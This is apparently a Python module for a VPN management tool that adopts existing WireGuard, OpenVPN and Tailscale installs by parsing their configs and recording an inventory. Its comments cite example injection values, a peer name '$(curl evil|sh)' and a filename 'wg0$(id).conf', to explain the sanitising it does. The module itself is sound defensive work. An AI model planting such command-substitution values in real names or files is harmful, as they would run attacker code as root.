"""Take over a VPN that something else installed.

This is the feature that decides whether anyone already running a VPN can use
Tessera at all.

Until now Tessera could only manage servers it had installed itself, because
management is driven by ``/etc/tessera/state.json`` and only the installer
wrote one.  Anyone who had already run ``wireguard-install.sh`` - which is most
of the people this tool is for - had no way in short of tearing down a working
VPN and rebuilding it.  That is not a migration path, it is a dare.

``adopt`` reads an existing install and writes the inventory that should have
been there: the interface, the port, the subnet, every peer and its public key
and address.  After it runs, ``status``, ``peer add``, ``audit`` and the rest
work exactly as if Tessera had built the thing.

Two honesty rules make this safe:

**Adopted shared resources are marked pre-existing and never removed.**  We did
not install ``wireguard-tools``, so we do not get to uninstall it.  Same for
sysctls and firewall state, which other things on the box may depend on.

**Adopted VPN files are removable but flagged.**  ``/etc/wireguard/wg0.conf``
unambiguously belongs to the VPN, so removal has to include it or "uninstall"
means nothing.  But it is marked ``adopted``, and the uninstaller says out loud
which files it is about to delete that it did not create.

It never guesses.  Anything it cannot determine is reported as unknown rather
than filled in with a plausible default, because a plausible-but-wrong subnet
in the inventory produces client configs that do not work.
"""

from __future__ import annotations

import re
import shlex
from typing import Dict, List, Optional, Tuple

from . import netcalc
from .errors import TesseraError
from .models import Facts, Peer, utcnow
from .state import Artifact, EngineRecord, ServerState
from .transport import Transport


class NothingToAdopt(TesseraError):
    pass


#: Peer names Tessera creates are validated on the way in. Names it *adopts*
#: come from a config file comment or a certificate subject, which anyone with
#: write access to the server chose, so they are untrusted input.
SAFE_NAME = re.compile(r"^[A-Za-z0-9][A-Za-z0-9_.-]{0,63}$")


def safe_peer_name(raw: str, fallback: str) -> Tuple[str, str]:
    """Return (usable name, note about what was changed).

    Every place a peer name currently reaches a shell quotes it properly, so
    this is not patching a live hole - it is making sure one cannot open later.
    A name like ``$(curl evil|sh)`` is one forgotten ``shlex.quote`` away from
    being executed as root, and a name containing a tab would silently corrupt
    the columns of the expiry table that the revocation script parses.

    The original is kept in the peer's note, so nothing is lost - it just stops
    being the thing that gets interpolated into commands and TSV rows.
    """
    cleaned = (raw or "").strip()
    if SAFE_NAME.match(cleaned):
        return cleaned, ""
    slug = re.sub(r"[^A-Za-z0-9_.-]", "-", cleaned)[:63].strip("-")
    if not slug or not slug[0].isalnum():
        slug = fallback
    return slug, "renamed from {!r} on adoption".format(cleaned[:80])


# --------------------------------------------------------------------------- #
# Discovery
# --------------------------------------------------------------------------- #
def discover(t: Transport, f: Facts) -> Dict[str, Dict]:
    """Find existing installs.  Read-only; changes nothing."""
    found: Dict[str, Dict] = {}
    wg = _discover_wireguard(t)
    if wg:
        found["wireguard"] = wg
    ovpn = _discover_openvpn(t)
    if ovpn:
        found["openvpn"] = ovpn
    ts = _discover_tailscale(t)
    if ts:
        found["tailscale"] = ts
    return found


def _discover_wireguard(t: Transport) -> Optional[Dict]:
    listing = t.run_root(
        "ls -1 /etc/wireguard/*.conf 2>/dev/null").stdout.strip()
    if not listing:
        return None
    confs = [l.strip() for l in listing.splitlines() if l.strip()]
    # The first interface is the one we manage; extra interfaces are reported
    # but not adopted, because a second tunnel usually means a site-to-site
    # link with its own rules that we would be wrong to take over.
    primary = confs[0]
    iface = primary.rsplit("/", 1)[-1][:-len(".conf")]
    # A filename is not a safe interface name. "/etc/wireguard/wg0$(id).conf"
    # is legal on disk, and this name goes on to build paths and a root-run
    # script, so it is checked here at the boundary where it enters the program.
    ok, why = netcalc.validate_iface(iface)
    if not ok:
        raise TesseraError(
            "refusing to adopt {}".format(primary),
            "{}. Rename the file to a normal interface name and try again."
            .format(why))
    body = t.run_root("cat {}".format(shlex.quote(primary))).stdout
    if not body.strip():
        return None

    parsed = parse_wg_conf(body)
    info: Dict = {
        "interface": iface,
        "config_path": primary,
        "other_interfaces": [c.rsplit("/", 1)[-1][:-5] for c in confs[1:]],
        "port": parsed["port"],
        "addresses": parsed["addresses"],
        "peers": parsed["peers"],
        "has_private_key": parsed["has_private_key"],
        "server_public_key": "",
        "managed_by": _detect_wg_installer(t),
        "files": [primary],
    }
    # Derive the server's public key from its private key, on the server, so
    # the key itself never travels.
    pub = t.run_root(
        "grep -m1 '^ *PrivateKey' {} 2>/dev/null | cut -d= -f2- | tr -d ' ' "
        "| wg pubkey 2>/dev/null".format(shlex.quote(primary)))
    if pub.ok and pub.out:
        info["server_public_key"] = pub.out

    for extra in ("/etc/wireguard/params",):
        if t.file_exists(extra):
            info["files"].append(extra)
            info.update(_parse_angristan_params(
                t.run_root("cat {}".format(shlex.quote(extra))).stdout))
    return info


def _detect_wg_installer(t: Transport) -> str:
    """Which tool set this up?  Affects nothing; it is shown to the user."""
    if t.file_exists("/etc/wireguard/params"):
        return "angristan/wireguard-install"
    if t.file_exists("/etc/wireguard/wg0.conf"):
        body = t.run_root("head -3 /etc/wireguard/wg0.conf").stdout.lower()
        if "wg-easy" in body:
            return "wg-easy"
        if "pivpn" in body:
            return "PiVPN"
    if t.file_exists("/etc/pivpn"):
        return "PiVPN"
    return "unknown"


def _parse_angristan_params(body: str) -> Dict:
    """Read the sidecar file angristan's installer leaves behind.

    Purely a bonus: it carries the endpoint and client DNS, which are not in
    the WireGuard config itself and would otherwise have to be asked for.
    """
    out: Dict = {}
    values = {}
    for line in body.splitlines():
        if "=" in line and not line.strip().startswith("#"):
            k, _, v = line.partition("=")
            values[k.strip()] = v.strip()
    if values.get("SERVER_PUB_IP"):
        out["endpoint"] = values["SERVER_PUB_IP"]
    dns = [values.get("CLIENT_DNS_1", ""), values.get("CLIENT_DNS_2", "")]
    dns = [d for d in dns if d]
    if dns:
        out["dns"] = dns
    if values.get("ALLOWED_IPS"):
        out["allowed_ips"] = values["ALLOWED_IPS"]
    if values.get("SERVER_PUB_NIC"):
        out["nic"] = values["SERVER_PUB_NIC"]
    return out


def parse_wg_conf(body: str) -> Dict:
    """Parse a wg-quick config into interface settings and peers.

    Handles the shapes real configs come in: comments as peer names (both
    ``### Client foo`` from angristan and ``### tessera:peer foo``), duplicate
    PostUp lines, and keys with ``=`` in the base64 - which is why every split
    here is a partition on the *first* ``=`` only.
    """
    addresses: List[str] = []
    port = 0
    has_private = False
    peers: List[Dict] = []
    current: Optional[Dict] = None
    section = ""
    pending_name = ""

    for raw in body.splitlines():
        line = raw.strip()
        if not line:
            continue
        if line.startswith("#"):
            m = re.match(r"#+\s*(?:tessera:peer|Client)\s+(\S+)", line)
            if m:
                pending_name = m.group(1)
            continue
        low = line.lower()
        if low.startswith("[interface]"):
            section = "interface"
            continue
        if low.startswith("[peer]"):
            section = "peer"
            current = {"name": pending_name, "public_key": "",
                       "preshared_key": "", "allowed_ips": []}
            peers.append(current)
            pending_name = ""
            continue
        if "=" not in line:
            continue
        key, _, value = line.partition("=")
        key = key.strip().lower()
        value = value.strip()

        if section == "interface":
            if key == "address":
                addresses = [a.strip() for a in value.split(",") if a.strip()]
            elif key == "listenport" and value.isdigit():
                port = int(value)
            elif key == "privatekey":
                has_private = bool(value)
        elif section == "peer" and current is not None:
            if key == "publickey":
                current["public_key"] = value
            elif key == "presharedkey":
                current["preshared_key"] = value
            elif key == "allowedips":
                current["allowed_ips"] = [a.strip() for a in value.split(",")
                                          if a.strip()]
    return {"addresses": addresses, "port": port, "peers": peers,
            "has_private_key": has_private}


def _discover_openvpn(t: Transport) -> Optional[Dict]:
    conf_path = ""
    for candidate in ("/etc/openvpn/server/server.conf",
                      "/etc/openvpn/server.conf"):
        if t.file_exists(candidate):
            conf_path = candidate
            break
    if not conf_path:
        return None
    body = t.run_root("cat {}".format(shlex.quote(conf_path))).stdout
    if not body.strip():
        return None

    settings = _parse_ovpn_conf(body)
    base = conf_path.rsplit("/", 1)[0]
    info: Dict = {
        "config_path": conf_path,
        "server_dir": base,
        "port": settings.get("port", 1194),
        "protocol": settings.get("proto", "udp").replace("6", ""),
        "cipher": settings.get("data-ciphers") or settings.get("cipher", ""),
        "auth_digest": settings.get("auth", ""),
        "subnet_v4": settings.get("server_subnet", ""),
        "tls_sig": settings.get("tls_sig", ""),
        "has_crl": "crl-verify" in body,
        "compression": bool(re.search(r"^\s*(comp-lzo|compress)", body, re.M)),
        "peers": [],
        "files": [conf_path],
        "managed_by": ("angristan/openvpn-install"
                       if t.file_exists(base + "/openvpn-install.conf")
                       else "unknown"),
    }
    easyrsa = base + "/easy-rsa"
    index = easyrsa + "/pki/index.txt"
    if t.file_exists(index):
        info["easyrsa_dir"] = easyrsa
        info["peers"] = _parse_index(
            t.run_root("cat {}".format(shlex.quote(index))).stdout,
            server_cn=settings.get("cert_cn", ""))
    return info


def _parse_ovpn_conf(body: str) -> Dict:
    out: Dict = {}
    for raw in body.splitlines():
        line = raw.strip()
        if not line or line.startswith("#") or line.startswith(";"):
            continue
        parts = line.split(None, 1)
        key = parts[0].lower()
        value = parts[1].strip() if len(parts) > 1 else ""
        if key == "port" and value.isdigit():
            out["port"] = int(value)
        elif key in ("proto", "auth", "cipher", "data-ciphers"):
            out[key] = value
        elif key == "server":
            bits = value.split()
            if len(bits) >= 2:
                try:
                    import ipaddress
                    net = ipaddress.ip_network("{}/{}".format(bits[0], bits[1]),
                                               strict=False)
                    out["server_subnet"] = str(net)
                except ValueError:
                    pass
        elif key == "cert":
            out["cert_cn"] = value.rsplit("/", 1)[-1].replace(".crt", "")
        elif key in ("tls-crypt-v2", "tls-crypt", "tls-auth"):
            out["tls_sig"] = {"tls-crypt-v2": "crypt-v2",
                              "tls-crypt": "crypt", "tls-auth": "auth"}[key]
    return out


def _parse_index(body: str, server_cn: str = "") -> List[Dict]:
    """Parse Easy-RSA's index.txt.

    Tab separated: status, expiry, revocation date, serial, filename, subject.
    Status V is valid, R revoked, E expired.  The server's own certificate is
    in here too and must not be listed as a client.
    """
    peers: List[Dict] = []
    for line in body.splitlines():
        parts = line.split("\t")
        if len(parts) < 6:
            continue
        status, expiry, revoked_at, serial, _, subject = parts[:6]
        m = re.search(r"/CN=([^/]+)", subject)
        if not m:
            continue
        name = m.group(1).strip()
        if server_cn and name == server_cn:
            continue
        # Fallback when the caller could not tell us the server's CN. These
        # are the shapes the common installers use for the *server* cert -
        # including Tessera's own "tessera_<random>", whose absence here is
        # what let the server show up as a rogue client.
        if (name.startswith("server_") or name.startswith("cn_")
                or name.startswith("tessera_")):
            continue
        peers.append({
            "name": name,
            "cert_serial": serial.strip(),
            "revoked": status.strip().upper() == "R",
            "expires": _asn1_to_iso(expiry),
        })
    return peers


def _asn1_to_iso(stamp: str) -> str:
    """Easy-RSA writes YYMMDDHHMMSSZ.  Turn it into something readable."""
    s = (stamp or "").strip().rstrip("Z")
    if len(s) < 12 or not s[:12].isdigit():
        return ""
    year = int(s[0:2])
    century = 2000 if year < 50 else 1900
    return "{}-{}-{}".format(century + year, s[2:4], s[4:6])


def _discover_tailscale(t: Transport) -> Optional[Dict]:
    if not t.which("tailscale"):
        return None
    raw = t.run_root("tailscale status --json 2>/dev/null")
    if not raw.ok or not raw.stdout.strip():
        return None
    try:
        import json
        data = json.loads(raw.stdout)
    except ValueError:
        return None
    self_node = data.get("Self") or {}
    return {
        "hostname": self_node.get("HostName", ""),
        "addresses": self_node.get("TailscaleIPs", []),
        "backend": data.get("BackendState", ""),
        "peer_count": len(data.get("Peer") or {}),
        "managed_by": "tailscale",
        "files": [],
    }


# --------------------------------------------------------------------------- #
# Adoption
# --------------------------------------------------------------------------- #
def build_state(found: Dict[str, Dict], f: Facts, tessera_version: str,
                existing: Optional[ServerState] = None) -> Tuple[ServerState, List[str]]:
    """Turn discovery output into an inventory.  Returns (state, warnings)."""
    state = existing or ServerState(tessera_version=tessera_version)
    warnings: List[str] = []

    if "wireguard" in found:
        warnings += _adopt_wireguard(state, found["wireguard"], f)
    if "openvpn" in found:
        warnings += _adopt_openvpn(state, found["openvpn"], f)
    if "tailscale" in found:
        warnings += _adopt_tailscale(state, found["tailscale"])
    return state, warnings


def _adopt_wireguard(state: ServerState, info: Dict, f: Facts) -> List[str]:
    warnings: List[str] = []
    addresses = info.get("addresses") or []
    subnet_v4 = subnet_v6 = ""
    for addr in addresses:
        try:
            net = netcalc.parse_net(addr)
        except ValueError:
            continue
        if net.version == 4 and not subnet_v4:
            subnet_v4 = str(net)
        elif net.version == 6 and not subnet_v6:
            subnet_v6 = str(net)

    if not subnet_v4:
        warnings.append(
            "WireGuard: could not read the IPv4 subnet from {}. New peers "
            "cannot be allocated an address until you set one."
            .format(info.get("config_path", "the config")))
    if not info.get("port"):
        warnings.append(
            "WireGuard: no ListenPort in the config. The kernel picked a "
            "random port at start-up, which means clients cannot be given a "
            "stable endpoint. Set ListenPort and restart the interface.")
    if not info.get("server_public_key"):
        warnings.append(
            "WireGuard: could not derive the server's public key. Client "
            "configs generated from here will be missing it until you add it.")

    config = {
        "interface": info.get("interface", "wg0"),
        "port": info.get("port", 0),
        "subnet_v4": subnet_v4,
        "subnet_v6": subnet_v6,
        "enable_ipv6": bool(subnet_v6),
        "endpoint": info.get("endpoint", "") or f.public_ipv4,
        "dns": info.get("dns", ["9.9.9.9", "149.112.112.112"]),
        "allowed_ips": info.get("allowed_ips", "0.0.0.0/0,::/0"),
        "server_public_key": info.get("server_public_key", ""),
    }

    peers: List[Dict] = []
    unnamed = 0
    renamed = 0
    for i, raw in enumerate(info.get("peers", []), 1):
        name = raw.get("name") or ""
        rename_note = ""
        if not name:
            unnamed += 1
            name = "peer-{}".format(i)
        else:
            name, rename_note = safe_peer_name(name, "peer-{}".format(i))
            if rename_note:
                renamed += 1
        v4 = v6 = ""
        for cidr in raw.get("allowed_ips", []):
            try:
                net = netcalc.parse_net(cidr)
            except ValueError:
                continue
            host = str(net.network_address)
            if net.version == 4 and not v4:
                v4 = host
            elif net.version == 6 and not v6:
                v6 = host
        peer = Peer(name=name, engine="wireguard",
                    public_key=raw.get("public_key", ""),
                    preshared_key=raw.get("preshared_key", ""),
                    address_v4=v4, address_v6=v6,
                    note=rename_note or "adopted from an existing install")
        # The private key belongs to the client device and is not on the
        # server, which is exactly as it should be.  We cannot re-export a
        # config for these peers, and the CLI says so when asked.
        from dataclasses import asdict
        stored = asdict(peer)
        stored["private_key"] = ""
        peers.append(stored)

    if renamed:
        warnings.append(
            "WireGuard: {} peer name(s) contained characters that are unsafe "
            "to put in a shell command or a config file, and were renamed. "
            "The original is recorded in each peer's note.".format(renamed))
    if unnamed:
        warnings.append(
            "WireGuard: {} peer(s) had no name comment in the config, so they "
            "were called peer-1, peer-2 and so on. Rename them with "
            "'tessera peer rename' so you can tell whose device is whose."
            .format(unnamed))
    if info.get("other_interfaces"):
        warnings.append(
            "WireGuard: {} was adopted, but this server also has {}. Those "
            "were left alone - a second interface is usually a site-to-site "
            "link with its own rules."
            .format(info.get("interface"),
                    " and ".join(info["other_interfaces"])))

    rec = EngineRecord(engine="wireguard", config=config, peers=peers,
                       installed=utcnow())
    state.set_engine(rec)

    # Shared resources: present, but not ours to remove.
    for package in ("wireguard", "wireguard-tools", "iptables", "qrencode"):
        state.record(Artifact(kind="package", ref=package, engine="wireguard",
                              pre_existing=True, adopted=True,
                              note="was already installed"), "wireguard")
    state.record(Artifact(kind="sysctl", ref="net.ipv4.ip_forward",
                          engine="wireguard", pre_existing=True, adopted=True),
                 "wireguard")
    # VPN-specific: unambiguously part of the tunnel, so removable - but
    # flagged, because deleting a file you did not write deserves a warning.
    for path in info.get("files", []):
        state.record(Artifact(kind="file", ref=path, engine="wireguard",
                              adopted=True,
                              note="existing file, adopted"), "wireguard")
    unit = "wg-quick@{}".format(info.get("interface", "wg0"))
    state.record(Artifact(kind="service", ref=unit, engine="wireguard",
                          adopted=True), "wireguard")
    return warnings


def _adopt_openvpn(state: ServerState, info: Dict, f: Facts) -> List[str]:
    warnings: List[str] = []
    if info.get("compression"):
        warnings.append(
            "OpenVPN: this server has compression enabled, which is the "
            "VORACLE vulnerability. Tessera will report it as a failure in "
            "'audit' and will not turn it on for anything it configures, but "
            "it did not switch it off for you - that would drop every "
            "connected client.")
    if not info.get("has_crl"):
        warnings.append(
            "OpenVPN: no crl-verify in the config, so revoking a certificate "
            "will have no effect until you add one.")
    if not info.get("easyrsa_dir"):
        warnings.append(
            "OpenVPN: no Easy-RSA PKI found, so Tessera cannot issue or "
            "revoke certificates on this server. Status and audit still work.")

    config = {
        "port": info.get("port", 1194),
        "protocol": info.get("protocol", "udp"),
        "subnet_v4": info.get("subnet_v4", ""),
        "cipher": info.get("cipher", "") or "AES-256-GCM",
        "auth_digest": info.get("auth_digest", "") or "SHA256",
        "tls_sig": info.get("tls_sig", "") or "crypt",
        "endpoint": f.public_ipv4,
        "compression": info.get("compression", False),
    }
    peers = []
    ovpn_renamed = 0
    for index, raw in enumerate(info.get("peers", []), 1):
        name, rename_note = safe_peer_name(raw["name"], "cert-{}".format(index))
        if rename_note:
            ovpn_renamed += 1
        peers.append({
            "name": name, "engine": "openvpn",
            "created": utcnow(), "cert_serial": raw.get("cert_serial", ""),
            "expires": raw.get("expires", ""),
            "revoked": raw.get("revoked", False),
            "note": rename_note or "adopted from an existing install",
            "public_key": "", "preshared_key": "", "private_key": "",
            "address_v4": "", "address_v6": "", "fingerprint": "",
            "last_handshake": "", "rx_bytes": 0, "tx_bytes": 0,
        })
    if ovpn_renamed:
        warnings.append(
            "OpenVPN: {} certificate subject(s) contained unsafe characters "
            "and were renamed. Revoking one uses the name in the certificate, "
            "so check these before relying on automatic revocation."
            .format(ovpn_renamed))
    state.set_engine(EngineRecord(engine="openvpn", config=config, peers=peers,
                                  installed=utcnow()))

    for package in ("openvpn", "easy-rsa", "iptables"):
        state.record(Artifact(kind="package", ref=package, engine="openvpn",
                              pre_existing=True, adopted=True,
                              note="was already installed"), "openvpn")
    for path in info.get("files", []):
        state.record(Artifact(kind="file", ref=path, engine="openvpn",
                              adopted=True), "openvpn")
    state.record(Artifact(kind="service", ref="openvpn-server@server",
                          engine="openvpn", adopted=True), "openvpn")
    return warnings


def _adopt_tailscale(state: ServerState, info: Dict) -> List[str]:
    state.set_engine(EngineRecord(
        engine="tailscale", installed=utcnow(),
        config={"hostname": info.get("hostname", "")}, peers=[]))
    state.record(Artifact(kind="package", ref="tailscale", engine="tailscale",
                          pre_existing=True, adopted=True), "tailscale")
    state.record(Artifact(kind="service", ref="tailscaled", engine="tailscale",
                          pre_existing=True, adopted=True), "tailscale")
    return ["Tailscale: devices are managed in the admin console, so Tessera "
            "reports its state but does not manage its peers."]


def summarise(found: Dict[str, Dict]) -> List[str]:
    """One human line per engine, for the confirmation prompt."""
    lines: List[str] = []
    wg = found.get("wireguard")
    if wg:
        lines.append(
            "WireGuard on {} — port {}, {} peer(s){}".format(
                wg.get("interface", "?"), wg.get("port") or "unset",
                len(wg.get("peers", [])),
                ", installed by {}".format(wg["managed_by"])
                if wg.get("managed_by") not in ("", "unknown") else ""))
    ov = found.get("openvpn")
    if ov:
        active = [p for p in ov.get("peers", []) if not p.get("revoked")]
        lines.append(
            "OpenVPN — {}/{}, {} active certificate(s){}".format(
                ov.get("port"), ov.get("protocol"), len(active),
                ", installed by {}".format(ov["managed_by"])
                if ov.get("managed_by") not in ("", "unknown") else ""))
    ts = found.get("tailscale")
    if ts:
        lines.append("Tailscale — {}, {} peer(s) on the tailnet".format(
            ts.get("backend", "unknown"), ts.get("peer_count", 0)))
    return lines
